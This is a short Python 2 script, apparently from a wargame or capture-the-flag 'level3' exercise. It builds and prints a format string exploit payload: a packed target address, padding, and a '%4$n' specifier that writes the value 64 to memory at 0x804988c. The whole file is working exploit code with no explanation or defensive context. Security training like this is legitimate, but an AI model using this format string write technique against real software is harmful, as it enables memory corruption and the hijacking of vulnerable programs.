#!/usr/bin/env python2

import struct

# Debug version to understand what's happening
target_addr = 0x804988c

print "=== LEVEL3 FORMAT STRING EXPLOIT DEBUG ==="
print "Target address: 0x%08x" % target_addr
print "Target value: 64"
print "Stack position: 4"
print ""

# Show the payload construction
payload = struct.pack("<L", target_addr)
padding = "A" * 60
format_str = "%4$n"

print "Payload breakdown:"
print "  Address: %s (4 bytes)" % repr(payload)
print "  Padding: %s (60 bytes)" % repr(padding)
print "  Format:  %s" % repr(format_str)
print "  Total length: %d characters" % (len(payload + padding + format_str))
print ""

full_payload = payload + padding + format_str
print "Full payload:"
print repr(full_payload)
print ""
print "Binary payload:"
print full_payload